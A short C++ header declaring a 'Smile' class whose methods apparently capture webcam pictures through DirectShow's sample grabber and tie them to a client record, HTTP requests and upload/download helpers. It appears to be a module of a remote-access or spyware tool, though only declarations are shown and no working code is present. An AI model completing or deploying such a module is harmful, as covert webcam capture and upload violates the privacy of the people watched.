#pragma once
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "strmiids")

#include <windows.h>
#include <dshow.h>
#include <iostream>
#include "PublicStructures.h"
#include "HttpRequests.h"
#include "UploadDownload.h"
#include "JsonFunctions.h"
#include "qedit.h"

using namespace std;

EXTERN_C const CLSID CLSID_NullRenderer;
EXTERN_C const CLSID CLSID_SampleGrabber;

class Smile
{
private:
	void CleanUp();
public:
	bool CatchSmile(string fileName, PublicStructers::client clientInfo);
	void TakePictureAction(string fileName, PublicStructers::client clientInfo);
};
